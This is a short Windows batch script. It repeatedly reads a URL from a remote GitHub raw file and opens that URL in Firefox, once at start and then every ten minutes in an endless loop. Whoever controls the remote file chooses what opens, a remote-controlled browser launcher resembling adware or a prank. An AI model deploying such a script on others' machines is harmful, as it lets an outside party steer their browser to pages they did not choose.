@echo off
for /f "delims=" %%i in ('curl https://raw.githubusercontent.com/AccountCool/coolrepo/master/cool') do set VAR=%%i
start firefox %VAR%
:loop
timeout /t 600 > NUL
for /f "delims=" %%i in ('curl https://raw.githubusercontent.com/AccountCool/coolrepo/master/cool') do set VAR=%%i
start firefox %VAR%
goto loop
